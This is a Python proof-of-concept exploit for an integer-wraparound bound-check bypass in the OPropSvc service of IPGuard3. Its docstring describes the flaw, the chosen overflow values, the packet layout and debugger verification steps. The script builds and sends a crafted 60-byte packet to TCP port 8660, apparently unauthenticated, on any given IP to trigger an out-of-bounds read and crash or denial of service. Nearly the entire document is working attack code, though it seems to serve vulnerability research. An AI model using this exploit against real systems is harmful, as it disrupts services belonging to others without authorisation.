#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PoC for OPropSVC_x64.exe — OCP cmd 0xE0B2 (CMainServerDisposal::PropertyGet)
32-bit integer-wraparound bound-check bypass → ~8 GB OOB read → AV / DoS.

TARGET BINARY  : OPropSvc_x64.exe (IPGuard3 OPropSvc service)
PDB            : E:\Tool\OPropSvc\bin\windows\OPropSvc_x64.pdb
LISTENER       : TCP/8660 (hard-coded; no auth before dispatch)
HANDLER        : 0x14001ED00  (renamed: OCP_E0B2_PropertyGet)
TRIGGER SITE   : 0x14001EE94  (cmp word ptr [rsi+rcx*2+10h], 0)

THE BUG
-------
At 0x14001EE85..EE8C the bound expression

    eax = 2 * ((uint32_t)L0 + (uint32_t)L1) + 0x14

is computed in 32-bit unsigned modular arithmetic via two LEA instructions,
then compared against n0x10 with `jb` (unsigned). If we pick L0,L1 so that the
sum wraps mod 2^32 to a small value, the bound check passes even though L0
itself is huge. Two lines later the handler does:

    cmp word ptr [rsi+rcx*2+10h], 0      ; rcx = L0 (zero-extended from ecx)

With L0 = 0xFFFFFFFF, rsi+rcx*2 = rsi + 0x1_FFFF_FFFE → ≈8 GB past the heap
buffer rsi → unmapped page → access violation in the worker thread.

The handler has SEH (#wind=8), so the process *probably* survives the AV but
the request is dropped and the connection is reset / times out. Verify with a
debugger attached: first-chance AV at 0x14001EE94 confirms the path.

CHOICE OF VALUES
----------------
    L0 = 0xFFFFFFFF
    L1 = 0x00000000
    => L0 + L1 (mod 2^32) = 0xFFFFFFFF
    => 2*(L0+L1) (mod 2^32) = 0xFFFFFFFE
    => 0xFFFFFFFE + 0x14 (mod 2^32) = 0x12

    n0x10 (inner_len, packet[32..35]) = 0x14
    Check `n0x10 < 0x12`  →  0x14 < 0x12  →  FALSE  →  fall through
    Then `rsi + rcx*2 + 0x10` with rcx=0xFFFFFFFF  →  rsi + 0x1FFFFFFFE + 0x10  → AV

PACKET LAYOUT (40-byte OCP header + 20-byte payload, total 60 bytes)
--------------------------------------------------------------------
    off  bytes              field                                 value
    ---  ------------------ ------------------------------------- -----
    00   4F 4D              magic ('OM' = 0x4D4F)                 fixed
    02   00 00              flags (0 = no DES, no compression)    0
    04   00 00              outer cmd                             0
    06   01 00              version                               1 (any)
    08   B2 E0              field8.lo = OCP sub-cmd dispatched    0xE0B2
    0A   00 00              field8.hi = handler version gate      0  (must be 0)
    0C   00 00 00 00        agent_id                              0
    10   00 00 00 00        crc                                   0
    14   00 00 00 00        packet[20..23]                        0
    18   00 00 00 00        packet[24..27]                        0
    1C   00 00 00 00        packet[28..31]                        0
    20   14 00 00 00        inner_len (handler n0x10)             0x14
    24   14 00 00 00        outer payload_len (OnRequest size)    0x14
    -- payload (20 bytes) --
    28   FF FF FF FF        L0  ★ overflow vector
    2C   00 00 00 00        L1
    30   00 00 00 00        propId
    34   00 00 00 00        flags2
    38   00 00 00 00        filler

USAGE
-----
    python3 poc_E0B2_oob_read.py <ip>            # send the trigger packet
    python3 poc_E0B2_oob_read.py <ip> --benign   # send a structurally-valid
                                                 # control packet for diff-baseline

Recommended verification:
  1. Attach WinDbg / x64dbg to OPropSvc_x64.exe before sending.
  2. Set a hardware-execute breakpoint at 0x14001EE94.
  3. Run --benign first → BP not hit (control: shape OK, no traversal).
  4. Run the trigger → BP hit; step one instruction; confirm AV at the WORD read.
  5. Net-side observation: trigger → connection reset / RST or read timeout;
     benign → server replies with a normal OCP response (often 0xF001/61441
     "no such property", since we send empty key strings).
"""

import argparse
import socket
import struct
import sys

DEFAULT_PORT = 8660


def build_header(field8_lo: int, inner_len: int, outer_len: int) -> bytes:
    """Pack the 40-byte OCP header used by CMainServerDisposal_OnRequest."""
    magic     = 0x4D4F        # 'OM'
    flags     = 0x0000        # no DES, no compression — keep on raw path
    cmd       = 0x0000        # outer cmd; CMainServerDisposal routes via field8.lo
    # ★ version low byte bit 0 MUST be 0. sub_1401B9FE0 is the dispatch gate
    #   in OnRequest: `if (packet[6] & 1) skip_dispatch;`. Setting version=1
    #   here makes the request silently ACK without ever reaching the handler.
    version   = 0x0000
    field8    = (0 << 16) | (field8_lo & 0xFFFF)  # hi=0 (gate); lo=sub-cmd
    agent_id  = 0x00000000
    crc       = 0x00000000    # flags=0 → no CRC checking on receive path
    f_20      = 0x00000000
    f_24      = 0x00000000
    f_28      = 0x00000000

    hdr = struct.pack(
        "<HHHH" + "IIIIIIII",
        magic, flags, cmd, version,
        field8, agent_id, crc,
        f_20, f_24, f_28,
        inner_len, outer_len,
    )
    assert len(hdr) == 40, f"header is {len(hdr)} bytes, expected 40"
    return hdr


def build_trigger_packet() -> bytes:
    # Inner length must be >= 0x10 (outer entry gate) and >= eax_after_wrap (0x12).
    # 0x14 = 20 bytes is the minimum that satisfies both.
    inner_len = 0x14
    outer_len = 0x14

    L0     = 0xFFFFFFFF        # ★ wraparound vector
    L1     = 0x00000000
    propId = 0x00000000
    flags2 = 0x00000000
    filler = 0x00000000
    payload = struct.pack("<IIIII", L0, L1, propId, flags2, filler)
    assert len(payload) == 0x14

    return build_header(0xE0B2, inner_len, outer_len) + payload


def build_benign_packet() -> bytes:
    """Same shape, but L0 small → bound check exits cleanly, no OOB read."""
    inner_len = 0x14
    outer_len = 0x14

    L0     = 0x00000001        # tiny → eax = 2*1 + 0x14 = 0x16; n0x10=0x14 < 0x16 → exit
    L1     = 0x00000000
    propId = 0x00000000
    flags2 = 0x00000000
    filler = 0x00000000
    payload = struct.pack("<IIIII", L0, L1, propId, flags2, filler)

    return build_header(0xE0B2, inner_len, outer_len) + payload


def hexdump(blob: bytes, width: int = 16) -> str:
    out = []
    for i in range(0, len(blob), width):
        chunk = blob[i:i + width]
        hexpart = " ".join(f"{b:02x}" for b in chunk)
        asciipart = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        out.append(f"  {i:04x}  {hexpart:<{width*3}} {asciipart}")
    return "\n".join(out)


def main() -> int:
    ap = argparse.ArgumentParser(description="OPropSvc cmd 0xE0B2 OOB read PoC")
    ap.add_argument("ip", help="target IP (OPropSvc host)")
    ap.add_argument("-p", "--port", type=int, default=DEFAULT_PORT)
    ap.add_argument("--benign", action="store_true",
                    help="send a structurally-valid control packet (no trigger)")
    ap.add_argument("--timeout", type=float, default=5.0)
    args = ap.parse_args()

    pkt = build_benign_packet() if args.benign else build_trigger_packet()
    label = "BENIGN" if args.benign else "TRIGGER"

    print(f"[+] {label} packet ({len(pkt)} bytes) → {args.ip}:{args.port}")
    print(hexdump(pkt))

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(args.timeout)
    try:
        sock.connect((args.ip, args.port))
    except OSError as e:
        print(f"[!] connect failed: {e}")
        return 1

    try:
        sock.sendall(pkt)
        print("[+] sent; waiting for response...")
        chunks = []
        while True:
            try:
                data = sock.recv(4096)
            except socket.timeout:
                break
            if not data:
                break
            chunks.append(data)
        resp = b"".join(chunks)
        if resp:
            print(f"[+] received {len(resp)} bytes:")
            print(hexdump(resp))
            if not args.benign:
                print("    (note: a normal-looking reply may mean the AV was caught"
                      " by SEH and a generic error was returned — still confirms"
                      " the path; check debugger / Windows Event Log)")
        else:
            print("[+] no data — connection closed silently"
                  + (" (consistent with trigger firing)" if not args.benign else ""))
    except (ConnectionResetError, BrokenPipeError) as e:
        if args.benign:
            print(f"[!] unexpected reset on benign packet: {e}")
        else:
            print(f"[+] connection reset / broken pipe — consistent with worker"
                  f" thread crash: {e}")
    finally:
        sock.close()

    return 0


if __name__ == "__main__":
    sys.exit(main())
